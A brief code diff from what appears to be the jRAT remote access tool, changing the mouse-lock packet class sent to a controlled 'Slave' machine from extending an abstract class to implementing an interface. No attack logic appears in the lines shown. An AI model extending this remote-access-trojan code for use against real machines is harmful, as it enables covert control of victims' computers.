@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet27ToggleMouseLock extends AbstractOutgoingPacket {
+public class Packet27ToggleMouseLock implements OutgoingPacket {
 
 	private boolean enabled;
 	private int monitor;
